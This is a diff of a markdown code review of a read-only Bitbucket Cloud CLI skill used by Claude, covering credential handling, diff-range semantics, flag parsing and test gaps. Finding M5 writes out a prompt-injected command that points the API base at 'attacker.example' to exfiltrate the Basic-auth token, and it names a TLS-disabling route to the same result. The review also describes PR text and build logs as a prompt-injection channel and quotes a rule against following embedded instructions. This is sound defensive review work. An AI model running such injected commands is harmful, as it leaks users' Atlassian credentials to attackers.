@@ -1,212 +1,275 @@
 # Codebase review: `bitbucket-cloud` skill
 
-Reviewed: 2026-10-13
-Scope: every file in the skill (about 960 lines in total).
+Reviewed: 2026-10-13, at commit `92850ef` (branch `feature/improvements`, clean working tree), version 1.1.0.
 
-| File | Lines | Role |
-|---|---|---|
-| [SKILL.md](../../SKILL.md) | 98 | Skill manifest and instructions Claude follows (trigger description, credential flow, command routing, workflows, gotchas) |
-| [scripts/bb.mjs](../../scripts/bb.mjs) | 773 | The implementation: a dependency-free, GET-only Bitbucket Cloud CLI (Node 18+) with 40 commands |
-| [references/bbql.md](../../references/bbql.md) | 42 | Bitbucket query language cheat sheet for `--q` and `--sort` |
-| [references/mcp-tool-map.md](../../references/mcp-tool-map.md) | 52 | Old `bb_*` MCP tool names mapped to `bb` commands, plus behavioural differences |
+| File                                                           | Lines | Role                                                                                        |
+| -------------------------------------------------------------- | ----- | ------------------------------------------------------------------------------------------- |
+| [SKILL.md](../../SKILL.md)                                     | 110   | Skill manifest and the instructions Claude follows                                          |
+| [scripts/bb.mjs](../../scripts/bb.mjs)                         | 2,134 | The implementation: a dependency-free, GET-only Bitbucket Cloud CLI (Node 20+), 40 commands |
+| [tests/bb.test.mjs](../../tests/bb.test.mjs)                   | 551   | `node:test` suite: unit tests, plus end-to-end tests against loopback mock servers          |
+| [references/bbql.md](../../references/bbql.md)                 | 42    | BBQL cheat sheet for `--q` / `--sort`                                                       |
+| [references/mcp-tool-map.md](../../references/mcp-tool-map.md) | 52    | Old `bb_*` MCP tool names mapped to commands                                                |
+| [README.md](../../README.md)                                   | 165   | Human-facing setup and usage guide                                                          |
+| [CHANGELOG.md](../../CHANGELOG.md)                             | 41    | Version history                                                                             |
+| [package.json](../../package.json)                             | 12    | Version, Node engine, `npm test`                                                            |
+| [.gitignore](../../.gitignore)                                 | 37    | Secrets, Node artefacts, logs, editor files                                                 |
+
+This replaces the 1.1.0 review of the same name, which is in git history at `55b4022`. New findings continue its numbering (M5, L13, …), so the IDs that [CHANGELOG.md](../../CHANGELOG.md) cites (M1–M4, L1–L12) still mean the same findings. Their current status is in [Earlier findings](#earlier-findings).
+
+## Status
+
+| Finding                                       | Severity | Status                                                 |
+| --------------------------------------------- | -------- | ------------------------------------------------------ |
+| M1 `get` can read secret-bearing endpoints    | Medium   | **Partly fixed** (docs done, code guard missing)       |
+| M5 Credentials go to any HTTPS API base       | Medium   | **Open** _(verified)_                                  |
+| M6 `diff` range order is reversed from git    | Medium   | **Open** _(verified against the API spec)_             |
+| L13–L20                                       | Low      | **Open**                                               |
+| Nits                                          | —        | **Open**                                               |
+| Test gaps                                     | —        | **Open**                                               |
+| M2–M4, L1–L12 from the 1.1.0 review           | —        | Fixed and covered by tests (live checks not recorded)  |
+
+`node --check scripts/bb.mjs` passes, and `node --test` passes all 46 tests on Node v24.12.0.
 
 ## How this review was done
 
-- Full read of all four files.
-- Offline checks only: `node --check` (syntax OK on Node v24.12.0), `bb help`, and the error paths that fail before any network call (unknown command, missing repo, MSYS-rewritten `get` path, flag typos). All behaved as described below.
-- **Nothing was run against the live Bitbucket API.** Findings that depend on Bitbucket's server behaviour are marked *(unverified)* and need a quick manual check.
-- A grep confirms the only HTTP method in the code is `GET` ([bb.mjs:137](../../scripts/bb.mjs#L137)).
+- Read every tracked file in full, plus the git history and the previous review at `55b4022`.
+- Ran the test suite.
+- Probed suspected issues locally:
+  - Imported `project`, `parseArgs` and `parseRepoToken` and called them directly.
+  - Ran `bb check` against an unresolvable `.invalid` host with dummy credentials.
+  - Printed what Git Bash does to arguments that start with `/`.
+- Checked Bitbucket's behaviour against Atlassian's published OpenAPI spec (`swagger.v3.json`): the `diff`/`diffstat` spec order, the `topic` default, the repeatable `state` and `path` parameters, and code-search paging.
+- **Nothing was run against live Bitbucket.** Findings that depend on live behaviour are marked _(unverified)_.
+- The only HTTP method in the code is still `GET` ([bb.mjs:425](../../scripts/bb.mjs#L425)).
 
 ## Summary
 
-This is a well-built skill. The design is small and coherent, the read-only and credential-handling guarantees are real (they are in the code, not just the prose), and the output shaping suits an LLM consumer. I found no critical issues.
+The skill is in good shape. The read-only guarantee holds by construction: there is no code path for any other HTTP method. Every redirect hop is checked, input is validated strictly, and output is shaped for an LLM reader. The 1.1.0 findings are fixed and each one has a test. **No critical or high-severity issues were found.**
 
-The main weaknesses are:
+What remains:
 
-1. The `get` escape hatch is broader than the policy intent.
-2. A few robustness gaps in the HTTP layer (hung body reads, opaque network errors).
-3. Silent error swallowing in `pr-context`.
-4. One documentation claim that the code does not back up.
-5. No tests.
+1. **Credential exfiltration through configuration (M5).** `BITBUCKET_API_BASE` accepts any HTTPS host, and the credentials go with it. A prompt-injected command such as `BITBUCKET_API_BASE=https://attacker.example node bb.mjs check` would send the Basic-auth header to that host. SKILL.md's "untrusted content" paragraph is the only defence today.
+2. **A silent wrong answer in a core workflow (M6).** Bitbucket reads `a..b` the opposite way to `git diff`, and nothing tells Claude this. `diff main..feature` shows what `main` has that `feature` lacks. Also, `--topic` does nothing, and `--topic=false` is silently dropped.
+3. **M1's code guard.** The docs part is done, but `get` still reads any endpoint, including webhooks, deploy keys and pipeline variables.
+4. **Smaller "silently wrong" leftovers (L13–L20).** These are the class of bug 1.1.0 set out to remove. The most notable is `--select`, which drops array and misspelled fields without a word.
 
-## Architecture
+## Architecture (unchanged since 1.1.0)
 
 ```
 SKILL.md ──(tells Claude to run)──▶ node scripts/bb.mjs <command> [args] [flags]
                                         │
-   parseArgs ─▶ command registry C{} ─▶ run(ctx) ─▶ { data, text }
-                                        │                │
-                    repoCtx / prCtx     │       --select / --json / text, --max-chars
-                    (ws/repo or URL)    ▼
-                    getList / getJson / getText ─▶ rawGet (GET only, timeout, retry 429/5xx, origin check)
+   parseArgs ─▶ checkFlags ─▶ checkArgs ─▶ command registry C{} ─▶ run(ctx) ─▶ { data, text, keepTail?, exitCode? }
+                                        │                                      │
+                  repoCtx / prCtx       │                   --select / --json / text, then --max-chars
+                                        ▼
+                  resolveRef, getList, getJson / getText ─▶ rawGet ─▶ fetchChecked (GET only, manual redirects)
 ```
 
-Key design points in [bb.mjs](../../scripts/bb.mjs):
-
-- **Command registry.** `def(name, usage, summary, run)` ([bb.mjs:322-323](../../scripts/bb.mjs#L322-L323)) fills one table `C`. Each command returns `{ data, text }`, so `--json`, `--select` and text output come from one code path ([bb.mjs:755-761](../../scripts/bb.mjs#L755-L761)). `help` is generated from the same table, so it cannot drift from the commands.
-- **Target parsing.** `parseRepoToken`, `repoCtx` and `prCtx` accept `ws/repo`, a bare `repo` (with `BITBUCKET_WORKSPACE`) or any bitbucket.org URL. A PR URL also yields the PR id ([bb.mjs:207-244](../../scripts/bb.mjs#L207-L244)).
-- **Ref resolution.** `resolveRef` tries branch, then tag, then commit, and swallows only 404s ([bb.mjs:260-271](../../scripts/bb.mjs#L260-L271)). This is what makes branch names containing `/` work for `file` and `browse`.
-- **Paging.** `getList` handles `--page`, `--pagelen` (capped at 100), `--all` (capped at 20 pages) and merges `--q` and `--sort` into the request ([bb.mjs:181-203](../../scripts/bb.mjs#L181-L203)).
-- **Output shaping.** Compact text by default. `--select` projects dotted fields. `--max-chars` truncates. Files are line-numbered and paged. Pipeline logs are tail-truncated.
+The previous review describes each layer in detail; that description still holds. Since then, commit `92850ef` changed `search-code` (verbatim snippets, `--files`), `pr-activity` (`updateChanges`), `pr-commits` (merge-commit label) and `pr-context` (source sha, explicit empty description). Each of those changes has a test.
 
 ### Strengths
 
-- **Read-only is enforced by construction.** There is no code path for any other HTTP verb. `get` is GET-only too.
-- **Credentials are handled well.**
-  - They are read from the environment, never printed (`check` reports only set/NOT SET) and sent only to the configured origin ([bb.mjs:92-96](../../scripts/bb.mjs#L92-L96)). The origin check also covers pagination `next` URLs, because every request goes through `rawGet`.
-  - SKILL.md tells Claude explicitly not to take tokens through chat, and says what to do if one leaks (revoke, rotate, report through the InfoSec incident process). This matches the managed policy.
-- **Good error UX.** Status-specific hints distinguish "no creds" from "bad creds" from "missing scope", and a private repo 404 is explained as a likely credentials problem ([bb.mjs:107-124](../../scripts/bb.mjs#L107-L124)).
-- **Context-economy features.** `--select`, `--q`/`--sort`, diffstat-before-diff, `pr-context`, line-numbered paged files and log tails all reduce token use.
-- **SKILL.md is well written.** The trigger description is specific, there is a question-to-command table, the workflows are concrete, and the Git Bash `/` rewriting pitfall is covered (and also guarded in code, [bb.mjs:349](../../scripts/bb.mjs#L349)).
-- **Zero dependencies** and a small, readable surface.
+- **Read-only and credential-safe within its threat model.** It sends GET only, and credentials go only to the API origin. Off-origin redirects are refused, except for step-log storage, which gets no credentials. Secrets are never printed.
+- **Honest output.** Every list has a "more results" footer. `pr-context` says "Unavailable: …" when a section fails, rather than showing an empty section. `prs` says when it is listing open PRs only, and `search-code` says its snippets may be incomplete.
+- **Strict CLI.** Unknown flags, flags a command would ignore, extra arguments, single-dash options, and numbers that are not whole are all errors, and most come with a suggestion.
+- **Context economy.** The CLI offers `--select`, server-side `--q`, diffstat before diff, line-numbered paged files, and tail-first logs fetched by range with colour codes removed.
+- **Tested.** The tests drive the real CLI against loopback mock servers, using only Node built-ins.
+- **Comments explain the non-obvious decisions**, such as the 406 on the log endpoint's `Accept` header, `process.exitCode` on Windows, and why `defaultBranch` does not guess.
 
 ## Findings
 
-Severity: **Medium** is worth fixing soon. **Low** is polish or hardening.
+Severity: **Medium** means worth fixing soon. **Low** means polish or hardening.
 
 ### Medium
 
-#### M1. `get` can read data the rest of the skill deliberately avoids (policy)
+#### M5. `BITBUCKET_API_BASE` sends credentials to any HTTPS host _(verified, open)_
 
-[bb.mjs:347-357](../../scripts/bb.mjs#L347-L357) accepts any v2.0 path and prints the raw JSON into the conversation. Depending on token scopes, that includes endpoints such as:
+`apiBase()` ([bb.mjs:225-240](../../scripts/bb.mjs#L225-L240)) checks only that the base is a valid `https://` URL, or `http://` on loopback. Any HTTPS host passes, and `fetchChecked` attaches the `Authorization` header to every request to that origin ([bb.mjs:431](../../scripts/bb.mjs#L431)).
 
-- webhooks (`…/hooks`, which SKILL.md itself uses as an example; webhook URLs can embed tokens)
-- deploy and SSH keys
-- repository pipeline variables (non-secured values are returned in clear)
-- repository and workspace access-token metadata
+With `BITBUCKET_API_BASE=https://bb-review-probe.invalid/2.0` and dummy credentials, `bb check` went ahead and tried to call `GET /user` on that host. It failed only because the host does not resolve.
 
-The managed policy says secrets and credentials must not enter prompts. Today the only barrier is the token's scope, and SKILL.md recommends read scopes of `repository, pullrequest, pipeline, issue`, which mostly avoids this. But the code adds no defence in depth, and SKILL.md advertises `hooks` as the example.
+This matters because the skill exists to read untrusted text: PR descriptions, comments and build logs. One inline environment prefix is enough to send the user's Atlassian token to an attacker. The prefix is easy to miss in a long command line. `NODE_TLS_REJECT_UNAUTHORIZED=0` plus a proxy variable is a second route to the same result. SKILL.md tells Claude not to follow embedded instructions ([SKILL.md:32-34](../../SKILL.md#L32-L34)), but the code itself does not enforce this.
 
 **Suggestion:**
-- Add a denylist in `get` for sensitive path segments (`hooks`, `deploy-keys`, `ssh-keys`, `variables`, `access-tokens`, `/user/emails`, `addon`).
-- Or restrict `get` to an allowlist of read-only resource roots.
-- Change the `hooks` example in SKILL.md and the `get` help text to something harmless.
 
-#### M2. Request timeout does not cover reading the response body
+1. Accept only `api.bitbucket.org` and loopback hosts (the tests need loopback). Bitbucket Cloud has no other API host, so nothing legitimate is lost. If a corporate gateway ever needs a custom host, add it to an allowlist in the script, where a change is reviewed. An environment opt-in would not help, because an injected command can set that too.
+2. Refuse to send credentials when `NODE_TLS_REJECT_UNAUTHORIZED=0`.
+3. Add a test for each.
 
-`clearTimeout(timer)` runs at [bb.mjs:142](../../scripts/bb.mjs#L142), before `await res.text()` at line 143. If the server sends headers and then stalls, the body read has no deadline and the process hangs until the tool-level timeout. Large diffs and pipeline logs are the likely victims.
+#### M6. Range specs are the reverse of `git diff`, and `--topic` cannot be turned off _(verified against the API spec, open)_
 
-**Suggestion:** move `clearTimeout` into a `finally` that runs after the body is fully read.
+Atlassian's spec for `diff/{spec}` and `diffstat/{spec}` says the first commit is "the commit containing the changes we wish to preview". The second is "the state to which we want to compare the first commit". The spec adds: "**This is the opposite of the order used in `git diff`.**"
 
-#### M3. Network-level failures are opaque and not retried
+Nothing in the skill says this:
 
-- A DNS, TLS, connection-reset or proxy failure makes `fetch` throw `TypeError: fetch failed`. The real reason is in `e.cause`, but [bb.mjs:764-772](../../scripts/bb.mjs#L764-L772) prints only `e.message`. The user and Claude see `Error: fetch failed` with no clue.
-- These errors are rethrown at once ([bb.mjs:171](../../scripts/bb.mjs#L171)), so only timeouts and 429/5xx are retried. A transient `ECONNRESET` fails the command.
-- Node's built-in `fetch` does not honour `HTTP_PROXY`/`HTTPS_PROXY` by default. On a corporate network that needs a proxy this would show up as `fetch failed`. Recent Node releases can enable proxy support (`NODE_USE_ENV_PROXY=1`), but nothing in SKILL.md mentions it. *(unverified for this network)*
+- `help`: `'Unified diff for a commit ("<hash>") or range ("<a>..<b>")'` ([bb.mjs:1261](../../scripts/bb.mjs#L1261))
+- SKILL.md: "Compare two refs | `diffstat` / `diff <ws>/<repo> <a>..<b>`" ([SKILL.md:67](../../SKILL.md#L67))
+- README and mcp-tool-map
+
+Claude naturally writes `main..feature` to mean "what does `feature` add". With Bitbucket's order, that request returns what `main` has that `feature` lacks. The output looks plausible and is wrong.
+
+There is a related flag bug. The spec says `topic` "defaults to true" (a three-dot diff against the merge base). As a result:
+
+- `--topic` sends `topic=true`, which is already the default, so the flag does nothing.
+- `--topic=false` parses to `false` (confirmed with `parseArgs`). `ctx.flags.topic || undefined` ([bb.mjs:1268](../../scripts/bb.mjs#L1268), [bb.mjs:1288](../../scripts/bb.mjs#L1288)) then turns that into "omit the parameter".
+
+So the plain two-dot diff, the one useful thing the flag could do, cannot be requested.
 
 **Suggestion:**
-- Include `e.cause?.code`/`e.cause?.message` in the error output.
-- Treat `ECONNRESET`, `ETIMEDOUT` and `EAI_AGAIN` as retryable.
-- Add a line to the setup notes about proxies.
 
-#### M4. SKILL.md claims branch names with `/` are handled for `commits --branch` and `branch`, but the code does not resolve refs there
+1. Document the order everywhere `<a>..<b>` appears: "`<changes>..<base>`, the reverse of `git diff`; for 'what does feature add to main', use `feature..main`". Name the parts that way in the usage string, for example `<source>..<dest>`.
+2. Replace `--topic` with `--two-dot`, which sends `topic=false`. Alternatively, forward an explicit `false` instead of dropping it.
+3. Add a test that asserts the query string.
 
-[SKILL.md:90](../../SKILL.md#L90) says branch names such as `feature/SSP-1024` are fine for `file`, `browse`, `branch` and `commits --branch` "because the script resolves refs to commit SHAs". Only `file` and `browse` call `resolveRef`.
+#### M1. `get` can still read secret-bearing configuration _(carried over, partly fixed)_
 
-- `commits` interpolates the raw flag into the path with no encoding: `/commits/${ctx.flags.branch}` ([bb.mjs:494](../../scripts/bb.mjs#L494)).
-- `branch` percent-encodes the name ([bb.mjs:476](../../scripts/bb.mjs#L476)) but does not resolve it.
+**Done in 1.1.0:**
 
-Whether Bitbucket accepts a slash branch in `/commits/{revision}` is *(unverified)*. Either way, the stated reason is wrong, and a branch name containing `#` or `?` would corrupt the URL in `commits`.
+- The `get` examples now use `default-reviewers` instead of `hooks`.
+- SKILL.md says not to use `get` for webhooks, deploy keys, SSH keys, pipeline variables, access tokens or account emails ([SKILL.md:36](../../SKILL.md#L36)).
 
-**Suggestion:** call `resolveRef` in `commits` (and `diff`/`diffstat`/`merge-base`, see L1), or correct the Gotchas text.
+**Still open:** `get` ([bb.mjs:786-806](../../scripts/bb.mjs#L786-L806)) still fetches any path on the API origin, so the token's scopes remain the only barrier. That barrier is weaker than it looks: `read:repository` covers several of these endpoints.
 
-#### M5. `pr-context` hides API errors as "nothing found"
-
-The `soft()` wrapper ([bb.mjs:627](../../scripts/bb.mjs#L627)) turns every failure of the diffstat, statuses and comments calls into `null`. The output then says "No diffstat available.", "No build statuses found." or "No comments.". A 403 (missing `pipeline` scope), a 429 or a timeout is therefore indistinguishable from an empty result. In a "should I merge this?" briefing, "No build statuses found" is a materially wrong answer when the truth is "could not read statuses".
-
-**Suggestion:** have `soft` record the error and print `Build status: unavailable (403 …)` instead.
+**Suggestion:** add the denylist from the previous review: `hooks`, `deploy-keys`, `ssh-keys`, `pipelines_config/variables` (and the other `variables` paths), `access-tokens`, `/user/emails`. Match against `new URL(url).pathname` after normalisation, so that `%2e%2e` tricks and full-URL arguments are covered too. Fail with a message that names the policy, and add a test.
 
 ### Low
 
-#### L1. Several path and query values are built without escaping
+#### L13. `--select` silently drops array fields and misspelled fields _(verified)_
 
-- `pr-context --branch` ([bb.mjs:619](../../scripts/bb.mjs#L619)), `issues --state/--kind` ([bb.mjs:685-686](../../scripts/bb.mjs#L685-L686)) and `search-repos` ([bb.mjs:394](../../scripts/bb.mjs#L394), which escapes `"` but not `\`) interpolate user text into BBQL. A quote or backslash in a branch name breaks or alters the query.
-- `diff`, `diffstat` and `merge-base` put `spec` straight into the path ([bb.mjs:512](../../scripts/bb.mjs#L512), [527](../../scripts/bb.mjs#L527), [534](../../scripts/bb.mjs#L534)). `?` or `#` changes the request, and `..` segments are normalised by `new URL`, so the request can reach a different path on the same origin.
-- The impact is contained: it is GET-only and the origin check holds. These are correctness and robustness issues rather than a security hole.
+`project()` ([bb.mjs:1990-2007](../../scripts/bb.mjs#L1990-L2007)) walks dotted paths with plain property access. Two things go wrong:
 
-**Suggestion:** one `bbqlString(s)` helper that escapes `\` and `"`, and a `rangeSpec()` helper that validates `<rev>` or `<rev>..<rev>` and encodes each part.
+- A path through an array, such as `reviewers.display_name` or `participants.approved`, reads a property of the array itself and gets `undefined`.
+- A typo such as `titel` also gives `undefined`.
 
-#### L2. `--max-chars` works against the tail-first design of log output
+`JSON.stringify` then leaves `undefined` keys out entirely. `project({values:[{id:1, reviewers:[{display_name:"A"}], title:"t"}]}, "id,reviewers.display_name,titel")` returns `{"values":[{"id":1}]}`. A reader concludes there are no reviewers. This is the same "plausible wrong result" that 1.1.0 removed from flag parsing.
 
-`pipeline-step-log` deliberately keeps the end of the log because failures are at the end ([bb.mjs:675-678](../../scripts/bb.mjs#L675-L678)). But `--max-chars` keeps the **head** of the final output ([bb.mjs:759-760](../../scripts/bb.mjs#L759-L760)). Combining them silently cuts off the failure. Use `--tail` for logs, not `--max-chars`. SKILL.md does not say so.
+**Suggestion:**
 
-**Suggestion:** add a one-line note in SKILL.md, or make `--max-chars` keep the tail when the command is `pipeline-step-log`.
+- Map through arrays, so `reviewers.display_name` returns `["A"]`.
+- Emit `null` rather than `undefined`, so the key stays visible.
+- Write a stderr warning when a path matched nothing in any item.
 
-The whole log is also downloaded and sliced locally. Pipeline logs support HTTP range requests *(unverified)*, which would avoid pulling megabytes to show 50 KB.
+#### L14. Git Bash path rewriting is caught only in `get` _(verified)_
 
-#### L3. The pipeline log endpoint may need a different `Accept` header *(unverified)*
+In Git Bash, `/src/a.ts` reaches Node as `C:/Program Files/Git/src/a.ts`. The same happens to `--path=/src/b.ts` (confirmed). `get` detects this case ([bb.mjs:792](../../scripts/bb.mjs#L792)). The following commands only strip leading slashes, which is too late, and then 404 with a "check spelling" hint:
 
-`getText` always sends `Accept: text/plain` ([bb.mjs:178](../../scripts/bb.mjs#L178)). As far as I recall, Bitbucket serves step logs as `application/octet-stream`, and a strict server could answer 406. Worth a one-off live test. If it fails, send `Accept: */*` for that call (as `get` already does).
+- `file` ([bb.mjs:1031](../../scripts/bb.mjs#L1031))
+- `browse` ([bb.mjs:940](../../scripts/bb.mjs#L940))
+- `file-history` ([bb.mjs:1060](../../scripts/bb.mjs#L1060))
+- `--path` on `diff`, `diffstat`, `pr-diff` and `pr-diffstat`
 
-#### L4. `comment-thread` silently stops at 2,000 comments
+**Suggestion:** move the `^[A-Za-z]:[\\/]` check into a shared helper for every repository path argument and for `--path`.
 
-It calls `getList` with `all: true` ([bb.mjs:571](../../scripts/bb.mjs#L571)) and ignores the `truncated` flag. A reply beyond the cap is simply missing from the thread. Any user-supplied `--page` or `--pagelen` also leaks into that internal call because `ctx.flags` is spread. Both are unlikely in practice, but the first is a silent wrong answer.
+#### L15. The diffstat headline reports one page as if it were the total
 
-#### L5. `pr-context` totals count only the first diffstat page
+`diffstatText` ([bb.mjs:692-704](../../scripts/bb.mjs#L692-L704)) prints `Diffstat for …: 100 file(s), +a -b` from the page it has. On a PR with 150 files, the only sign that the totals are partial is the footer, about 100 lines further down. `pr-context` already warns in this case.
 
-It requests one page of 100 entries ([bb.mjs:629](../../scripts/bb.mjs#L629)) and sums them. A PR with more than 100 changed files reports wrong totals with no "more" note (unlike `pr-diffstat`, which appends `pageNote`).
+**Suggestion:** when `r.next` is set, word the headline as "first 100 files (more exist), +a -b so far".
 
-#### L6. Argument parsing is permissive
+#### L16. `parseRepoToken` does not handle git remotes _(verified)_
 
-- Unknown flags are silently ignored. `--pagelenn 5` or `--branchh x` does nothing, and the user gets a plausible but wrong default result.
-- A value flag swallows the next token even if it is another flag (`--ref --raw` sets `ref` to `--raw`).
-- `-h` is not recognised.
+Claude often gets the repository from `git remote get-url origin`. The parser ([bb.mjs:571-607](../../scripts/bb.mjs#L571-L607)) handles these forms badly:
 
-**Suggestion:** keep a per-command set of known flags and reject others with a "did you mean" hint.
+- `git@bitbucket.org:ws/repo.git` parses as workspace `git@bitbucket.org:ws`, repo `repo.git`.
+- `https://bitbucket.org/ws/repo.git` keeps the `.git` suffix.
 
-#### L7. No HTTPS enforcement on `BITBUCKET_API_BASE`
+Both give a 404 with a hint about credentials or spelling. Separately, a PR URL with a malformed id such as `…/pull-requests/12abc` becomes `NaN`, and the error then says "Missing pull request id".
 
-The origin check compares against `BASE` itself ([bb.mjs:92-96](../../scripts/bb.mjs#L92-L96)). If the environment variable is set to an `http://` URL, Basic-auth credentials are sent in clear. This is a self-inflicted configuration, but a one-line guard would remove it.
+**Suggestion:**
 
-#### L8. Smaller robustness points
+- Accept the `git@bitbucket.org:` SSH form.
+- Strip a trailing `.git`.
+- Validate the URL's PR id with `int()`.
 
-- `search-code` assumes `content_matches` is always an array ([bb.mjs:707](../../scripts/bb.mjs#L707)). A path-only match would throw a `TypeError`.
-- `diffstatText` sums `lines_added`/`lines_removed` without defaults ([bb.mjs:291-292](../../scripts/bb.mjs#L291-L292)). A binary file entry with missing counts would produce `NaN`.
-- A 200 response that is not JSON (a corporate proxy or login page) surfaces as `Unexpected token <` from `JSON.parse`, with no mention that the body was HTML.
-- `fileResult` splits on `\n`, so CRLF files keep a trailing `\r` on every line. Binary files are decoded as text.
-- 429 handling ignores the `Retry-After` header and always sleeps 1s then 2s ([bb.mjs:155](../../scripts/bb.mjs#L155)).
-- `defaultBranch` swallows every error and falls back to `'main'` ([bb.mjs:250-257](../../scripts/bb.mjs#L250-L257)). A repo whose default is `master`, hit during an outage, produces a misleading "could not resolve ref 'main'".
-- `resolveRef` makes up to three sequential calls per ref, so a plain `file` costs up to five requests (default branch, three resolution attempts, content). A cheap pre-check could skip straight to `/commit/` for a 40-character hex string.
-- `parseRepoToken` accepts any `http(s)` URL and takes the first two path segments. An API URL such as `https://api.bitbucket.org/2.0/repositories/ws/repo` would parse as workspace `2.0`, repo `repositories`. It does no network I/O on that URL, so this is a UX issue only.
+#### L17. `pr-context` ignores `--branch` when an id is also given
 
-### Documentation issues
+With a PR URL or an id, `--branch` is skipped without a word ([bb.mjs:1582](../../scripts/bb.mjs#L1582)). Every other ignored flag is rejected.
 
-| Where | Issue |
-|---|---|
-| [SKILL.md:55](../../SKILL.md#L55) | `<branch\|tag\|sha>` has unescaped pipes inside a Markdown table row, so renderers split the cell. [mcp-tool-map.md](../../references/mcp-tool-map.md) escapes its pipes correctly; this one needs the same. |
-| [SKILL.md:73](../../SKILL.md#L73) | `--all` is documented as "capped at 20 pages", but the cap is tunable via `--max-pages`, which only appears in `bb help`. |
-| [SKILL.md:93](../../SKILL.md#L93) | Retries are described as covering 429 and 5xx. Timeouts are also retried (undocumented), and network errors are not (see M3). |
-| [SKILL.md:90](../../SKILL.md#L90) | See M4. |
-| [SKILL.md:62](../../SKILL.md#L62) and [bb.mjs:347](../../scripts/bb.mjs#L347) | The `hooks` example conflicts with M1. |
-| Whole skill | No README, changelog or version marker. The user-agent string is hard-coded as `bitbucket-cloud-skill/1.0` ([bb.mjs:21](../../scripts/bb.mjs#L21)). |
+**Suggestion:** fail with "pass either a PR id/URL or --branch, not both".
 
-## Testing and maintainability
+#### L18. `browse` cannot get past 100 entries
 
-- **No tests of any kind.** `main()` runs on import ([bb.mjs:764](../../scripts/bb.mjs#L764)) and nothing is exported, so the pure helpers (`parseRepoToken`, `parseArgs`, `project`, `diffstatText`, `duration`, `fileResult`) cannot be unit-tested without spawning the CLI. A small refactor would unlock `node --test`:
-  - Guard the entry point: `if (import.meta.url === pathToFileURL(process.argv[1]).href) main()`.
-  - Export the pure helpers.
-  - Add a mock for `fetch` so the retry, paging and `resolveRef` logic can be tested offline.
-- **Dense one-line formatters.** Many `text:` values are 200+ character single lines ([bb.mjs:404](../../scripts/bb.mjs#L404), [542](../../scripts/bb.mjs#L542), [656](../../scripts/bb.mjs#L656), [688](../../scripts/bb.mjs#L688)). They work, but they are hard to review and diff.
-- **Repeated patterns.**
-  - The commit-list formatter appears in `commits`, `pr-commits` and `file-history`.
-  - The "header, map, page note, or none" shape repeats in about 15 commands.
-  - Small helpers such as `listText(title, r, fmt)` and `commitLine(c)` would shorten the file by roughly 10%.
-- **Mixed responsibilities in `getList`.** It owns paging, filter merging and sorting. That is fine today, but `search-code` also runs through it and picks up `--q`, which does not apply to that endpoint.
+`browse` is not a list command, so it has no `--page`. `--limit` is capped at 100 ([bb.mjs:942](../../scripts/bb.mjs#L942)), and the footer's only advice is to browse a subdirectory. A flat directory with more than 100 entries cannot be listed in full. `--limit` also has two meanings: entries for a directory, but lines when the path turns out to be a file.
+
+**Suggestion:** make `browse` a paged command, with `--all` and footer support. The API also supports `max_depth` for recursive listings.
+
+#### L19. `prs` accepts only one `--state`
+
+The API lets `state` be repeated. The CLI sends one value ([bb.mjs:1306-1307](../../scripts/bb.mjs#L1306-L1307)), so "does a PR for X exist at all?" takes four calls. SKILL.md asks Claude to make exactly that check before saying a PR does not exist.
+
+Separately, the `openOnly` heading logic assumes that a `--q` mentioning `state` overrides Bitbucket's default OPEN filter _(unverified)_. If it does not, `prs --q 'state="MERGED"'` returns nothing under the heading "Pull requests", without the open-only hint.
+
+**Suggestion:**
+
+- Accept `--state MERGED,DECLINED` (or `--state ALL`) and repeat the parameter.
+- Check the `--q` interaction once against live Bitbucket.
+
+#### L20. Output flags are validated only after the request
+
+`--max-chars` is parsed with `int()` after `command.run()` has finished ([bb.mjs:2078](../../scripts/bb.mjs#L2078)). `--max-chars abc` therefore makes all the API calls and then fails. `--select ""` is silently treated as no selection.
+
+**Suggestion:** validate both in `main` before `run()`.
+
+### Nits
+
+- `check` prints `API base: ${BASE}` verbatim ([bb.mjs:744](../../scripts/bb.mjs#L744)). A base that contains `user:pass@` would print that userinfo, and `fetch` rejects such URLs in any case. `apiBase()` should reject URLs with userinfo.
+- The version string is kept in three places: `VERSION` in [bb.mjs:21](../../scripts/bb.mjs#L21), [package.json](../../package.json) and [README.md:7](../../README.md#L7). A one-line test that compares them would stop drift.
+- `diff` and `diffstat` send a single `--path`, although the API accepts the parameter repeated. A comma-separated list would cover multi-file review in one call.
+- `commit` calls `c.message.trim()` with no guard ([bb.mjs:1204](../../scripts/bb.mjs#L1204)). Every other formatter tolerates missing fields.
+- In `search-code`, two `content_matches` that cover the same line print it twice, with a `...` between the copies ([bb.mjs:1945-1952](../../scripts/bb.mjs#L1945-L1952)).
+- The `search-code` row in [mcp-tool-map.md:42](../../references/mcp-tool-map.md#L42) does not list `--files`.
+
+## Testing
+
+The suite is good. It drives the real CLI, uses no dependencies and runs in about 4 s. Each 1.1.0 finding and each `92850ef` change has a test. Nothing tests these:
+
+| Area                                                                   | Why it matters                                                                    |
+| ---------------------------------------------------------------------- | --------------------------------------------------------------------------------- |
+| Retries: 429 with `Retry-After`, 5xx backoff, the 30 s give-up         | Most intricate code in the file ([bb.mjs:456-524](../../scripts/bb.mjs#L456-L524)) |
+| Request timeout and transient network errors (`NetworkError` hints)    | Same                                                                              |
+| `--all` across several pages, and the `--max-pages` truncation footer  | Correctness of every "complete" answer                                            |
+| `comment-thread`: nested replies and the truncation warning            | Recursive walk with no coverage                                                   |
+| `--select` and `--max-chars` (head cut, and `keepTail` for logs)       | L13 would have been caught                                                        |
+| Non-loopback `http://` API base is refused                             | Security check; M5's fix needs the same kind of test                              |
+| `Authorization` **is** sent to the API origin                          | Only its absence on foreign hops is asserted                                      |
+| HTML instead of JSON (`parseJson` proxy message)                       | Common behind corporate proxies                                                   |
+| Bare `<repo>` with `BITBUCKET_WORKSPACE`                               | Documented feature                                                                |
+
+The retry tests would wait 1–3 s each, because backoff uses real `sleep`. A hidden `BITBUCKET_RETRY_BASE_MS` (or an exported constant the tests can override) would keep the suite fast.
+
+## Earlier findings
+
+Status of the 1.1.0 review's findings, as cited in [CHANGELOG.md](../../CHANGELOG.md):
+
+| ID       | Topic                                                    | Status now                                                                                   |
+| -------- | -------------------------------------------------------- | -------------------------------------------------------------------------------------------- |
+| M1       | `get` and secrets                                        | Partly fixed: examples and SKILL.md guidance done; denylist not implemented (see above)      |
+| M2       | Fetched content is untrusted                             | Fixed: [SKILL.md:32-36](../../SKILL.md#L32-L36)                                               |
+| M3       | Extra arguments ignored                                  | Fixed and tested                                                                             |
+| M4       | Missing "more results" footer                            | Fixed and tested                                                                             |
